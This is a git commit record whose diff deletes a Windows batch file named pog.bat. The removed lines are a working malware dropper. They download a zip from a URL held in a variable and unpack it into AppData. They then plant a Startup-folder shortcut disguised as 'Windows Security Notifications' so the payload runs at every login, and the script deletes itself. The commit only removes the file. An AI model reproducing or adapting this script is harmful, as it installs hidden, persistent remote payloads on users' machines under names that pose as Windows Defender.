0a503a283533585fb0389fd4ca376b252576366d
SubashGIT1 <104957927+SubashGIT1@users.noreply.github.com>
2022-08-23 16:53:23 +0545

    Delete pog.bat

--- pog.bat
+++
@@ -1,9 +0,0 @@
-del launch.vbs
-cd %appdata%
-powershell -Command "Invoke-WebRequest "%Defendeurmum%" -OutFile Defender.zip"
-powershell -command "Expand-Archive -Force 'Defender.zip' 'Windows_file'"
-del Defender.zip
-powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Security Notifications.lnk');$s.TargetPath='%appdata%/Windows_file/Defender/"Windows Security.exe"';$s.Save()"
-cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
-"Windows Security Notifications.lnk"
-(goto) 2>nul & del "%~f0"
